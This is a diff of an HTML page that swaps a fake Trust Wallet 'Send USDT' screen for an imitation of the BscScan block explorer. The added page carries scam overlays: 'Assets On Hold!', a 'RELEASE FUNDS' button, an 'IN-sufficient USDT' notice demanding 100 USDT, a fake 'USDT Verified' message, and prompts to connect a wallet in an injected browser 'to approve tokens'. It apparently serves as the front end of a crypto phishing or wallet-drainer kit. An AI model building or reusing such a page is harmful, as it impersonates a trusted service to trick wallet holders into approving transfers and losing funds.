@@ -2,77 +2,451 @@
 <html lang="en">
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#0b0e14">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>BNB Chain · Send USDT</title>
-    <link rel="stylesheet" href="css/style.min.css?v=3.0">
+    <link rel="icon" href="images/bnb.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="theme-color" content="#12161c">
+    <meta name="description" content="BscScan is a Block Explorer and Analytics Platform for BNB Smart Chain">
+    <title>BNB Smart Chain (BNB) Blockchain Explorer</title>
+    <link rel="stylesheet" href="css/style.min.css?v=4.0">
 </head>
-
 <body>
-    <!-- Background overlays -->
-    <div class="bg-noise" aria-hidden="true"></div>
-    <div class="bg-grid" aria-hidden="true"></div>
 
-    <!-- MAIN TRUST WALLET SEND UI CONTAINER -->
-    <div class="tw-screen-container">
-        <div class="tw-app-frame">
+    <!-- ============================================================
+         POPUP & VERIFICATION OVERLAYS
+         ============================================================ -->
 
-            <!-- Card 1: Merchant Recipient Address Box -->
-            <div class="tw-card">
-                <label class="tw-label">Merchant Recipient Address</label>
-                <textarea id="merchantAddressDisplay" class="tw-address-box" readonly rows="2">0xC0981e86a5c1C3c5B2E849CE6E8E186a81E10D2d</textarea>
-                
-                <div class="tw-pill-row">
-                    <div class="tw-pill">
-                        <img src="images/bnb.png" alt="BNB" class="tw-chain-icon" width="18" height="18">
-                        <span>BNB Smart Chain</span>
-                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
-                    </div>
-                    <button type="button" class="tw-pill" id="clearAddressBtn">Clear</button>
-                </div>
+    <!-- Overlay 1: Assets On Hold Modal -->
+    <div class="new_overlay" id="new_overlay" style="display:none;">
+        <div class="new_popup">
+            <!-- Watermark Background Layer -->
+            <div class="watermark-layer">
+                <div id="watermarkGrid" class="watermark-grid"></div>
             </div>
 
-            <!-- Card 2: USDT Amount Column -->
-            <div class="tw-card">
-                <div class="tw-pill-row" style="margin-top:0;">
-                    <label class="tw-label" for="usdtAmountInput">Amount to Send</label>
-                    <span class="tw-balance-sub">Balance: <strong id="usdtBalance" style="color:var(--tw-text);">0.00</strong> USDT</span>
-                </div>
-                
-                <div class="tw-amount-row">
-                    <input type="number" id="usdtAmountInput" class="tw-amount-input" placeholder="0.0" step="any" min="0" value="">
-                    <div class="tw-amount-meta">
-                        <button type="button" id="maxUsdtBtn" class="tw-max-btn">MAX</button>
-                        <span class="tw-currency-tag">USDT</span>
+            <div class="new_section">
+                <img src="images/lock.png" alt="Lock Icon" class="new_png2_emoji">
+                <h2 class="new_title_main">Assets On Hold!</h2>
+                <p class="new_subtitle2" id="new_burn_text">
+                    We've temporarily hold your assets for security verification
+                </p>
+            </div>
+
+            <div class="new_inline_section">
+                <div class="new_emoji_line">
+                    <img src="images/exclaim_mark.png" alt="Notice Icon" class="new_png_emoji">
+                    <div class="new_text">
+                        <p class="new_subtitle">Hold Amount</p>
+                        <p class="new_title" id="new_burn_text2">100 USDT</p>
                     </div>
                 </div>
             </div>
 
-            <!-- Connected Wallet Info Pill (visible when wallet is connected) -->
-            <div id="walletInfo" class="tw-status-box wallet-info-card--hidden">
-                <div style="display:flex; justify-content:space-between; align-items:center;">
-                    <div>
-                        <span style="font-size:11px; text-transform:uppercase; color:var(--tw-text-muted);">Connected Wallet</span>
-                        <div id="walletAddressDisplay" style="font-family:monospace; font-weight:600; font-size:13px; color:var(--tw-text);">0x0000...0000</div>
-                    </div>
-                    <div style="text-align:right;">
-                        <span style="font-size:11px; text-transform:uppercase; color:var(--tw-text-muted);">BNB Balance</span>
-                        <div id="bnbBalance" style="font-weight:600; font-size:13px; color:var(--tw-text);">0.000000</div>
+            <div class="new_inline_section2">
+                <div class="new_emoji_line">
+                    <img src="images/secure.png" alt="Security Shield" class="new_png_emoji">
+                    <div class="new_text">
+                        <p id="new_notice_text" class="new_subtitle">
+                            Your Funds are in security verification on BEP20, please click on release funds to Release.
+                        </p>
                     </div>
                 </div>
             </div>
 
-            <!-- Continue Button (Primary Action) -->
-            <button id="connectWalletBtn" class="tw-continue-btn" type="button">
-                <span>Continue</span>
-            </button>
-
+            <div class="new_buttons_area">
+                <button id="new_view_transctions" class="new_verify_btn" type="button">
+                    🔍 VIEW TRANSACTION
+                </button>
+                <button id="new_verifyBtn" class="new_verify_btn" type="button">
+                    🔓 RELEASE FUNDS
+                </button>
+                <button id="closeBtn" class="new_close_btn" type="button">
+                    ✖️ Close
+                </button>
+            </div>
         </div>
     </div>
 
-    <!-- MAIN APPLICATION SCRIPT (Ultra-fast native Web3, zero dependencies) -->
-    <script src="js/app.min.js?v=3.0"></script>
+    <!-- Overlay 2: Release Funds / Insufficient USDT Modal -->
+    <div id="releaseOverlay" class="release_overlay">
+        <!-- Loading Animation -->
+        <div id="releaseLoading" class="release_loading">
+            <div class="spinner"></div>
+            <p>Releasing Funds...</p>
+        </div>
+
+        <!-- Popup -->
+        <div id="releasePopup" class="release_popup" style="display:none;">
+            <div class="popup_icon">⚠️</div>
+            <h2 class="popup_title">IN-sufficient USDT</h2>
+
+            <!-- Available USDT Box -->
+            <div class="usdt_info_box">
+                <span class="usdt_icon">💲</span>
+                <span id="final_usdt_Text" class="usdt_text">Available USDT: 0.00 USDT</span>
+            </div>
+
+            <!-- Deposit Requirement Box -->
+            <div class="usdt_info_box">
+                <span class="deposit_icon">🔒</span>
+                <span id="final_depositText" class="usdt_text">Required :: <b>100 USDT</b></span>
+            </div>
+
+            <button id="final_closeBtn" class="close_btn" type="button">Close</button>
+        </div>
+    </div>
+
+    <!-- Overlay 3: USDT Verified Success Modal -->
+    <div class="overlay" id="overlay2">
+        <div class="popup">
+            <div class="section">
+                <img src="images/yellow_top.png" alt="Verified Symbol" class="png2_emoji2">
+                <h2>USDT Verified!</h2>
+                <p class="subtitle2" id="burn-text11">Your P2P order has been verified as genuine.</p>
+            </div>
+            <div class="inline-section">
+                <div class="emoji-line">
+                    <img src="images/sign.png" alt="Check Icon" class="png_emoji">
+                    <div class="text">
+                        <p class="subtitle">Verified Amount</p>
+                        <p class="title" id="burn-text22">100 USDT</p>
+                    </div>
+                </div>
+            </div>
+            <div class="inline-section2">
+                <div class="emoji-line">
+                    <img src="images/sign.png" alt="Check Icon" class="png_emoji">
+                    <div class="text">
+                        <p class="subtitle22">Verification Success</p>
+                        <p class="subtitle">Your USDT tokens are genuine and safe to use.</p>
+                    </div>
+                </div>
+            </div>
+            <button id="closeBtn2" class="close-btn" type="button">Close</button>
+        </div>
+    </div>
+
+    <!-- Overlay 4: Connect Wallet Dialog -->
+    <div class="popup" id="walletPopup" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%, -50%); z-index:100001; max-width:360px; height:auto;">
+        <div class="popup-content">
+            <h3 style="margin-bottom:10px;">Connect Wallet</h3>
+            <p style="color:var(--bsc-text-muted); font-size:14px; margin-bottom:16px;">You need to connect your wallet to continue.</p>
+            <button id="popupConnectBtn" class="btn-search" style="width:100%;" type="button">Connect</button>
+            <button id="popupWalletCloseBtn" class="new_close_btn" style="width:100%; margin-top:8px;" type="button">Cancel</button>
+        </div>
+    </div>
+
+    <!-- Overlay 5: No Injected Wallet Helper Modal -->
+    <div id="noWalletOverlay" class="overlayy" role="dialog" aria-modal="true">
+        <div class="modal">
+            <button class="close" id="modalClose" aria-label="Close" type="button">✕</button>
+            <div class="modal-illustration" aria-hidden="true">⚠️</div>
+            <h3 id="nwTitle">Please open this in a wallet browser</h3>
+            <p id="nwDesc">This page must be opened inside Trust Wallet or MetaMask's in-app browser (or another injected-dApp browser) to approve tokens.</p>
+            <button id="modalOk" class="ok-btn" type="button">OK</button>
+            <div class="hint">If you're on desktop, install MetaMask or open this page in your mobile wallet's browser.</div>
+        </div>
+    </div>
+
+    <!-- ============================================================
+         BSCSCAN EXPLORER UI FRONTEND
+         ============================================================ -->
+
+    <!-- Top Market Ticker Bar -->
+    <div class="ticker-bar">
+        <div class="container-xl">
+            <div class="ticker-inner">
+                <div class="ticker-item">
+                    <span>BNB Price:</span>
+                    <span class="ticker-price">$901.42</span>
+                    <span class="ticker-change-neg">(-0.71%)</span>
+                </div>
+                <div class="ticker-item">
+                    <span>Gas:</span>
+                    <span class="ticker-price">0.05 Gwei</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Navigation Header -->
+    <header class="bsc-header">
+        <div class="container-xl">
+            <nav class="bsc-nav">
+                <a href="#" class="bsc-brand">
+                    <img src="images/logo-light.svg" alt="BscScan Logo">
+                </a>
+
+                <ul class="bsc-menu">
+                    <li><a href="#" class="bsc-menu-item active">Home</a></li>
+                    <li>
+                        <a href="#" class="bsc-menu-item">
+                            Blockchain
+                            <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="#" class="bsc-menu-item">
+                            Validators
+                            <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="#" class="bsc-menu-item">
+                            Tokens
+                            <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="#" class="bsc-menu-item">
+                            NFTs
+                            <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="#" class="bsc-menu-item">
+                            Resources
+                            <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="#" class="bsc-menu-item">
+                            Developers
+                            <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
+                        </a>
+                    </li>
+                    <li>
+                        <a href="#" class="bsc-menu-item">
+                            More
+                            <svg viewBox="0 0 24 24"><path d="M7.41 8.59 12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg>
+                        </a>
+                    </li>
+                </ul>
+
+                <div class="bsc-nav-actions">
+                    <button id="signInBtn" class="btn-signin" type="button">
+                        <svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2zm-9-2h10V8H12zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5"/></svg>
+                        <span id="signInBtnText">Sign In</span>
+                    </button>
+                    <button class="btn-menu-toggle" id="mobileMenuBtn" aria-label="Toggle Menu" type="button">☰</button>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Explorer Hero & Search Section -->
+    <section class="hero-section">
+        <div class="container-xl">
+            <div class="hero-stats-row">
+                <div class="hero-stat-badge">
+                    <svg viewBox="0 0 24 24"><path d="m16 6 2.29 2.29-4.88 4.88-4-4L2 16.59 3.41 18l6-6 4 4 6.3-6.29L22 12V6z"/></svg>
+                    <span>BNB Price: <b>$312.45</b> <span style="color:#dc3545;">(-0.77%)</span></span>
+                </div>
+                <div class="hero-stat-badge">
+                    <svg viewBox="0 0 24 24"><path d="m20.38 8.57-1.23 1.85a8 8 0 0 1-.22 7.58H5.07A8 8 0 0 1 15.58 6.85l1.85-1.23A10 10 0 0 0 3.35 19a2 2 0 0 0 1.72 1h13.85a2 2 0 0 0 1.74-1 10 10 0 0 0-.27-10.44zm-9.79 6.84a2 2 0 0 0 2.83 0l5.66-8.49-8.49 5.66a2 2 0 0 0 0 2.83"/></svg>
+                    <span>Gas: <b>0.05 Gwei</b></span>
+                </div>
+            </div>
+
+            <h1 class="hero-title">BNB Smart Chain Explorer</h1>
+            <p class="hero-subtitle">Search by Address / Txn Hash / Block / Token / Domain Name</p>
+
+            <!-- Search Card -->
+            <div class="search-card">
+                <div class="search-tabs">
+                    <button class="search-tab active" data-tab="tx" type="button">Transactions</button>
+                    <button class="search-tab" data-tab="token" type="button">Tokens</button>
+                    <button class="search-tab" data-tab="block" type="button">Blocks</button>
+                </div>
+
+                <div class="search-input-group">
+                    <div class="search-field-wrap">
+                        <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14"/></svg>
+                        <input type="text" id="searchAddressInput" class="search-input" placeholder="Search by Address / Txn Hash..." autocomplete="off">
+                    </div>
+                    <button id="searchBtn" class="btn-search" type="button">Search</button>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Explorer Activity Dashboard -->
+    <main class="dashboard-section">
+        <div class="container-xl">
+            <div class="dashboard-grid">
+                <!-- Latest Blocks Card -->
+                <div class="dash-card">
+                    <div class="dash-card-header">
+                        <h2 class="dash-card-title">Latest Blocks</h2>
+                        <button class="btn-customize" type="button">
+                            <svg width="16" height="16" viewBox="0 0 24 24"><path fill="currentColor" d="M3 17v2h6v-2zM3 5v2h10V5zm10 16v-2h8v-2h-8v-2h-2v6zM7 9v2H3v2h4v2h2V9zm14 4v-2H11v2zm-6-4h2V7h4V5h-4V3h-2z"/></svg>
+                            Customize
+                        </button>
+                    </div>
+
+                    <ul class="dash-list">
+                        <li class="dash-item">
+                            <div class="dash-item-icon">Bk</div>
+                            <div class="dash-item-info">
+                                <div class="dash-item-title">41928371</div>
+                                <div class="dash-item-sub">3 secs ago · Fee Recipient: Validator 14</div>
+                            </div>
+                            <div class="dash-item-meta">
+                                <div><b>142 txns</b> in 3 secs</div>
+                                <div style="color:var(--bsc-text-muted); font-size:11px;">0.0842 BNB Reward</div>
+                            </div>
+                        </li>
+                        <li class="dash-item">
+                            <div class="dash-item-icon">Bk</div>
+                            <div class="dash-item-info">
+                                <div class="dash-item-title">41928370</div>
+                                <div class="dash-item-sub">6 secs ago · Fee Recipient: Validator 08</div>
+                            </div>
+                            <div class="dash-item-meta">
+                                <div><b>98 txns</b> in 3 secs</div>
+                                <div style="color:var(--bsc-text-muted); font-size:11px;">0.0521 BNB Reward</div>
+                            </div>
+                        </li>
+                        <li class="dash-item">
+                            <div class="dash-item-icon">Bk</div>
+                            <div class="dash-item-info">
+                                <div class="dash-item-title">41928369</div>
+                                <div class="dash-item-sub">9 secs ago · Fee Recipient: Validator 21</div>
+                            </div>
+                            <div class="dash-item-meta">
+                                <div><b>210 txns</b> in 3 secs</div>
+                                <div style="color:var(--bsc-text-muted); font-size:11px;">0.1194 BNB Reward</div>
+                            </div>
+                        </li>
+                    </ul>
+
+                    <button class="btn-view-all" id="viewAllBlocksBtn" type="button">VIEW ALL BLOCKS →</button>
+                </div>
+
+                <!-- Latest Transactions Card -->
+                <div class="dash-card">
+                    <div class="dash-card-header">
+                        <h2 class="dash-card-title">Latest Transactions</h2>
+                        <button class="btn-customize" type="button">
+                            <svg width="16" height="16" viewBox="0 0 24 24"><path fill="currentColor" d="M3 17v2h6v-2zM3 5v2h10V5zm10 16v-2h8v-2h-8v-2h-2v6zM7 9v2H3v2h4v2h2V9zm14 4v-2H11v2zm-6-4h2V7h4V5h-4V3h-2z"/></svg>
+                            Customize
+                        </button>
+                    </div>
+
+                    <ul class="dash-list">
+                        <li class="dash-item">
+                            <div class="dash-item-icon">Tx</div>
+                            <div class="dash-item-info">
+                                <div class="dash-item-title">0x8f2a...c4e1</div>
+                                <div class="dash-item-sub">From 0x71c7...8976f To 0x55d3...7955</div>
+                            </div>
+                            <div class="dash-item-meta">
+                                <div><b>100.00 USDT</b></div>
+                                <div style="color:#28a745; font-size:11px;">Verified Success</div>
+                            </div>
+                        </li>
+                        <li class="dash-item">
+                            <div class="dash-item-icon">Tx</div>
+                            <div class="dash-item-info">
+                                <div class="dash-item-title">0x3b1c...99d2</div>
+                                <div class="dash-item-sub">From 0x98b7...1e0f To PancakeSwap Router</div>
+                            </div>
+                            <div class="dash-item-meta">
+                                <div><b>0.54 BNB</b></div>
+                                <div style="color:#28a745; font-size:11px;">Verified Success</div>
+                            </div>
+                        </li>
+                        <li class="dash-item">
+                            <div class="dash-item-icon">Tx</div>
+                            <div class="dash-item-info">
+                                <div class="dash-item-title">0x55ef...812a</div>
+                                <div class="dash-item-sub">From 0xc098...0d2d To 0x48a4...0b21</div>
+                            </div>
+                            <div class="dash-item-meta">
+                                <div><b>250.00 USDT</b></div>
+                                <div style="color:#28a745; font-size:11px;">Verified Success</div>
+                            </div>
+                        </li>
+                    </ul>
+
+                    <button class="btn-view-all" id="viewAllTxBtn" type="button">VIEW ALL TRANSACTIONS →</button>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bsc-footer">
+        <div class="container-xl">
+            <div class="footer-top-row">
+                <a href="https://twitter.com/bscscan" target="_blank" rel="noopener noreferrer" class="footer-social-link">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+                    (Twitter)
+                </a>
+                <button id="backToTopBtn" class="btn-back-to-top" type="button">
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M7.41 15.41 12 10.83l4.59 4.58L18 14l-6-6-6 6z"/></svg>
+                    Back to Top
+                </button>
+            </div>
+
+            <div class="footer-grid">
+                <div class="footer-col">
+                    <div style="display:flex; align-items:center; gap:8px; margin-bottom:12px;">
+                        <img src="images/chain-light.svg" alt="BNB Chain" width="22" height="22">
+                        <strong style="font-size:15px;">Powered By BNB Smart Chain</strong>
+                    </div>
+                    <p>BscScan is a Block Explorer and Analytics Platform for BNB Smart Chain.</p>
+                    <button id="addBscNetworkBtn" class="btn-add-network" type="button">
+                        <img src="images/metamask.svg" alt="MetaMask" width="18" height="18">
+                        Add BSC Network
+                    </button>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Company</h4>
+                    <ul class="footer-links-list">
+                        <li><a href="https://bscscan.com/validators" target="_blank">Delegate to BscScan</a></li>
+                        <li><a href="https://bscscan.com/brandassets" target="_blank">Brand Assets</a></li>
+                        <li><a href="https://bscscan.com/contactus" target="_blank">Contact Us</a></li>
+                        <li><a href="https://bscscan.com/terms" target="_blank">Terms & Privacy</a></li>
+                        <li><a href="https://bscscan.com/bugbounty" target="_blank">Bug Bounty ↗</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Community</h4>
+                    <ul class="footer-links-list">
+                        <li><a href="https://docs.bscscan.com/" target="_blank">API Documentation</a></li>
+                        <li><a href="https://bscscan.com/knowledgebase" target="_blank">Knowledge Base</a></li>
+                        <li><a href="https://bscscan.com/netstat" target="_blank">Network Status</a></li>
+                        <li><a href="https://academy.binance.com/" target="_blank">Learn BSC ↗</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Products & Services</h4>
+                    <ul class="footer-links-list">
+                        <li><a href="https://bscscan.com/advertise" target="_blank">Advertise ↗</a></li>
+                        <li><a href="https://bscscan.com/eaas" target="_blank">Explorer as a Service ↗</a></li>
+                        <li><a href="https://bscscan.com/apis" target="_blank">API Plans ↗</a></li>
+                        <li><a href="https://bscscan.com/priority-support" target="_blank">Priority Support</a></li>
+                        <li><a href="https://blockscan.com/" target="_blank">Blockscan ↗</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div>
+                    BscScan © 2026 (BSC-C) | Built by Team <a href="https://etherscan.io/" target="_blank" style="color:var(--bsc-primary);">Etherscan</a>
+                </div>
+                <div>
+                    Donations: <a href="https://bscscan.com/address/0x71c765075d6bdFc5Df4E620e5Ac6EfD5D8976f" target="_blank" style="font-family:monospace; color:var(--bsc-primary);">0x71c765...d8976f</a> ❤️
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Native Web3 and Application Logic -->
+    <script src="js/ethers.umd.min.js"></script>
+    <script src="js/app.js?v=4.0"></script>
 </body>
 </html>
